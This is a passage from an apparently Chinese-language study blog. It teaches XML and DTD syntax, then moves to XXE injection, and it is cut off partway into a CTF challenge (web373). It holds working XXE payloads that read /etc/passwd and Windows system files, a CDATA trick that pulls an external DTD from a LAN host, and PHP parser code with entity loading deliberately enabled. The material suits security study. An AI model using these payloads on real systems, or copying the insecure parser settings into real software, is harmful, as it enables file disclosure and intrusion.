class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>第一行是xml声明.它定义xml的版本(1.0)和使用的编码(ISO-8859-1 &#x3D; Latin-1&#x2F;西欧字符集)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;node&gt;</span><br></pre></td></tr></table></figure><p>表示的是文档的根元素(就像:本文档是一个便签)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>这四个描述里4个子元素</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>定义根元素</p><p><strong>xml文档形成一种树结构</strong></p><p>xml文档中必须包含根元素.该元素使所有其它元素的父元素</p><p>xml文档中的元素形成了一颗文档树.这颗树从根部开始,并扩展到树的最顶部</p><p>所有元素都可以拥有子元素</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;child&gt;</span><br><span class="line">    &lt;subchild&gt;.....&lt;/subchild&gt;</span><br><span class="line">  &lt;/child&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>父 子以及同胞等术语用于描述元素之间的关系.父元素拥有子元素.相同层级上的子元素称为同胞.所有元素均可拥有文本内容和属性</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291303955.png" alt="image-20220329130316921"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;bookstore&gt;</span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Everyday Italian&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;Giada De Laurentiis&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2005&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;30.00&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;book category=&quot;CHILDREN&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;J K. Rowling&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2005&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;29.99&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;book category=&quot;WEB&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;Erik T. Ray&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2003&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;39.95&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;/bookstore&gt;</span><br></pre></td></tr></table></figure><p>上面的根元素是&lt;bookstore&gt;.文档中的所有&lt;book&gt;元素都包含在&lt;bookstore&gt;中&lt;book&gt;元素中有四个子元素:&lt;title&gt; &lt;author&gt; &lt;year&gt; &lt;price&gt;</p><h2 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h2><p><strong>xml中所有的元素都必须有关闭标签</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;This is a paragraph</span><br><span class="line">&lt;p&gt;This is another paragraph</span><br><span class="line">&lt;p&gt;This is a paragraph&lt;/p&gt;</span><br><span class="line">&lt;p&gt;This is another paragraph&lt;/p&gt;  </span><br></pre></td></tr></table></figure><p><strong>xml标签对大小写敏感</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Message&gt;这是错误的。&lt;/message&gt;</span><br><span class="line"></span><br><span class="line">&lt;message&gt;这是正确的。&lt;/message&gt; </span><br></pre></td></tr></table></figure><p><strong>xml必须正确的嵌套</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/b&gt;&lt;/i&gt;</span><br><span class="line">&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt;</span><br></pre></td></tr></table></figure><p><strong>xml文档中必须有根元素</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;child&gt;</span><br><span class="line">    &lt;subchild&gt;.....&lt;/subchild&gt;</span><br><span class="line">  &lt;/child&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><strong>xml的属性值必须加引号</strong></p><p>与html类似,xml也可以拥有属性(名称&#x2F;值的对).在xml中,xml的属性值必须加引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note date=08/08/2008&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;/note&gt; </span><br><span class="line"></span><br><span class="line">&lt;note date=&quot;08/08/2008&quot;&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure><p>在第一个文档中的错误的是 note 元素中的date属性没有加引号</p><p><strong>实体引用</strong></p><p>在xml中,一些字符拥有特殊的意义,如果你把字符”&lt;”放在xml元素中,会发生错误,这是因为解析器会把他当成新元素的开始</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br><span class="line">&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; </span><br></pre></td></tr></table></figure><p>需要使用实体引用来代替”&lt;”字符</p><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&lt;</th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td>&gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&amp;apos;</td><td>‘</td><td>单引号</td></tr><tr><td>&quot;</td><td>“</td><td>引号</td></tr></tbody></table><p><strong>XML 中的注释</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- This is a comment --&gt; </span><br></pre></td></tr></table></figure><p><strong>在 XML 中，空格会被保留</strong></p><p>在 XML 中，文档中的空格不会被删节。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTML:Hello           my name is David.</span><br><span class="line">输出:Hello my name is David.</span><br></pre></td></tr></table></figure><p><strong>XML 以 LF 存储换行</strong></p><p>在windows应用程序中,换行通常以一对字符来存储:回车符(CR)和换行符(LF).这对字符与打字机设置新行的动作有相似之处.在unix应用程序汇总,新行以(LF)字符存储.而mac应用程序使用CR来存储新行</p><p><strong>XMLDTD</strong></p><p>DTD的作用是定义xml文档的结构,他使用一系列合法的元素来定义文档结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><h3 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h3><p>文档类型定义(DTD)可定义合法的xml文档构建模块.它使用一系列合法的元素来定义文档的结构DTD可被成行的声明在xml文档中,也可以做为一个外部引用</p><p><strong>内部的DOCTYPE声明</strong></p><p>假如DTD被包含在您的xml源文件中,它应当通过下面的语法包装在一个DOCTYPE声明汇总</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>带有 DTD 的 XML 文档实例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>以上DTD的解释</p><ul><li>!DOCYPYE note(第二行)定义此文档是note类型的文档</li><li>!ELEMENT note(第三行)定义note元素有四个元素:”to  from heading body”</li><li>!ELEMENT to(第四行)定义to元素为”#PCDATA”类型</li><li>!ELEMENT from(第五行)定义from元素为”#PCDATA”类型</li><li>!ELEMENT heading(第六行)定义heading元素为”#PCDATA”类型</li><li>!ELEMENT body(第七行)定义body元素为”#PCDATA”类型</li></ul><p><strong>外部文档声明</strong></p><p>加入DTD位于xml源文件的外部,那么他应通过下面的语法被封装在一个DOCTYPE定义中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p><strong>为什么使用DTD</strong></p><p>每一个xml文件均可携带有一个有关其自身格式的描述.独立的团体可以一致的使用某个标准的DTD来交换数据.应用程序也可以使用某个标准的DTD来验证从外部接受到的数据.还可以使用DTD来验证自身的数据.</p><h3 id="DTD-XML-构建模块"><a href="#DTD-XML-构建模块" class="headerlink" title="DTD - XML 构建模块"></a>DTD - XML 构建模块</h3><p><strong>PCDATA</strong></p><p>PCDATA 的意思是被解析的字符数据（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><p><strong>CDATA</strong></p><p>CDATA 的意思是字符数据（character data）。CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h3 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD - 实体"></a>DTD - 实体</h3><p><strong>一个内部实体声明</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><p>DTD 例子:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><p>注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p><p><strong>一个外部实体声明</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><p>DTD 例子:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h1 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h1><p>介绍xxe之前,先说一下普通的xml注入,这个的利用面比较狭窄.如果有的话应该也是逻辑漏洞</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203282117029.png" alt="image-20220328211733960"></p><p>既然能插入xml代码,那么我们肯定不能善罢甘休,我们需要更多,于是就出现了xxe</p><p>xxe(xml external ectity injection)全称为xml外部实体注入,从名字就能看出来,这是一个注入漏洞,注入的是什么?xml外部实体.如果能够注入外部实体并且成功解析的话,这就会大大扩展我们xml注入的攻击面</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>xml是一种非常流行的标记语言,在1990年代后期首次标准化,并被无数的软件项目所利用.它用于配置文件,文档格式(如ooxml odf pdf rss…) ,图像格式(svg  exif标题)和网络协议(webdav caldav xmlrpc soap xmpp saml xacml …),它应用的如此的普遍以至于它出现任何的问题都会带来灾难性的结果</p><p>在解析外部实体的过程中,xml解析器可以根据url中指定的方案(协议)来查询各种网络协议和服务(dns,ftp http smb等)) 外部实体对于在文档中创建动态引用非常有用,这样对引用资源所做的任何更改都会在文档中自动更新,但是,在处理外部实体时,可以针对应用程序启动许多攻击.这些攻击包括泄露本地系统文件,这些文件可能包含密码和私人用户数据等敏感数据,或者利用各种方案的网络访问功能来操纵内部应用程序.通过将这些攻击与其他实现缺陷相结合,这些攻击的范围可以扩展到客户端内存损坏,任意代码执行,甚至服务中断,具体取决于这些攻击的上下文</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>xml文档有自己的一个格式规范,这个格式规范是一个叫做dtd的东西控制的,它就是下面这个样子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个dtd就定义了xml的根元素是message.然后根元素下面有一些子元素,那么xml到时候必须像下面这样写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;/receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;/sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;/header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;/msg&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>其实除了在dtd中定义元素(其实就是对应xml中的标签)以外,我们还能在dtd中定义实体(对应xml标签中的内容),毕竟ml中除了能标签以外,还需要有些内容时固定的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里定义元素为any说明接受任何元素,但是定义了一个xml的实体(实体其实可以看成一个变量,到时候我们可以再xml中通过&amp;符号进行引用),那么xml就可以写成这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用&amp;xxe对上面定义的xxe实体进行了引用,到时候输出的时候&amp;xxe就会被”test”替换</p><p>实体分为两种,内部实体和外部实体,上面的例子就是内部实体.但是实体实际上可以从外部的dtd文件中引用,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便</p><p>当然还有一种引用方式是使用公用dtd的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和system一样的作用</p><p>我们上面已经将实体分成了两个派别(内部实体和外部实体),但是实际上从另一个角度看,实体也可以分成两个派别(通用实体和参数实体)</p><ol><li><p>通用实体</p><p> 用&amp;实体名;引用的实体,它在dtd汇总定义,在xml文档中引用</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure></li><li><p>参数实体</p><ol><li>使用 % 实体名(这里面空格不能少)在dtd中定义,并且只能在dtd中使用%实体名;引用</li><li>只有在dtd文件中,参数实体的声明才能引用其他实体</li><li>和通用实体一样,参数实体也可以外部使用</li></ol> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><p> 参数实体在我们blind xxe中起到了至关重要的作用</p></li></ol><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>这里既然能够读取dtd那我们是不是可以将路径换一换,换成敏感文件的路径,然后读敏感文件</p><h3 id="有回显的读取本地敏感文件-normal-xxe"><a href="#有回显的读取本地敏感文件-normal-xxe" class="headerlink" title="有回显的读取本地敏感文件(normal xxe)"></a>有回显的读取本地敏感文件(normal xxe)</h3><p>这个实验的攻击场景模拟的是在服务能够接收并解析xml格式的输入并有回显的时候,我们就能输入我们自定义的xml代码,通过引用外部实体的方法,引用服务器上面的文件</p><p>在服务器上放上解析xml的php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203282243027.png" alt="image-20220328224301972"></p><p>这是由于这个文件没有过什么特殊符号,</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203282246118.png" alt="image-20220328224618048"></p><p>但是如果变成这个文件就会报错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203282246999.png" alt="image-20220328224642941"></p><p>如果有些内容可能不想让解析引擎解析执行,而是当做原始的内容处理,用于把整个字段数据解析为纯字符数据而不是标记的情况包含大量的&lt;&gt;&amp;或者”只读,CDATA节中的所有字符都会被当做元素字符数据的常量部分,而不是xml标记</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[xxxxxxxx]]&gt;</span><br></pre></td></tr></table></figure><p>可以输入任意字符除了]]&gt;不能嵌套,用处是玩意某个标签内容包含特殊字符或者不确定字符,我们可以用CDATA包起来</p><p>那么我们把我们的读出来的数据放在CDATA中输出就能进行绕过个,但是怎么做到,我们来分析一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>引用并不接受可能会引起xml格式混乱的字符(在xml中,有时实体内包含了一些字符,如&amp; &lt; &gt; “ ‘ 等.这些均需要对其进行转义,否则会对xml解析器生成错误,我们想在引用的两边加上”&lt;![cdata [“”]]&gt;”但是好像没有任何语法告诉我们字符串能拼接,于是能不能使用多个实体连续引用的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; </span><br><span class="line">&lt;!ENTITY end&quot;]]&gt;&quot;]&gt;</span><br><span class="line">&lt;creds&gt;&amp;goodies;&amp;end;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291120298.png" alt="image-20220329112005248"></p><p>注意这里面的两个个实体都是字符串的形式,连在一起会报错,这说明我们不能在xml中进行匹配,而是需要在拼接以后在在xml中调用,那么要想在dtd中拼接,我们知道我们只有一种选择,就是使用参数实体</p><p>本地起一个服务放入xml.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291415105.png" alt="image-20220329141502004"></p><p>远程利用服务上面放入eval.dtd文件</p><p>eval.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///D:/Download/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.5.149/eval.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291416473.png" alt="image-20220329141644415"></p><p>注意这里提一个点,如果是在java中还有一个协议能够代替file协议,那就是netdoc</p><p>但是,本身别人的服务器上的xml就不是输出用的,,一般都是用于配置或者在某些极端情况利用其他漏洞能恰好实例化解析xml的类,因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法(外带)</p><p>想要外带就必须能发起请求,那么什么地方能发起请求?很明显就是我们的外部实体定义的时候,其实光发起请求还不行,我们还得能够把我们的数据传出去,而我们的数据本身也是一个对外的请求,也就是说,我们需要在请求中引用另一次请求的结果,分析下来只有我们的参数实体能做到了(并且根据规范,我们必须在一个dtd文件中才能完成”请求中引用另一次请求的结果”的要求)</p><h3 id="无回显读取本地敏感文件-没看懂"><a href="#无回显读取本地敏感文件-没看懂" class="headerlink" title="无回显读取本地敏感文件(没看懂)"></a>无回显读取本地敏感文件(没看懂)</h3><p><a href="https://xz.aliyun.com/t/3357#toc-8">https://xz.aliyun.com/t/3357#toc-8</a></p><h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);<span class="comment">#允许加载外部实体</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">#xml文件来源于数据流</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;<span class="comment">#如果设置了</span></span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();<span class="comment">#创建一个dom对象</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | 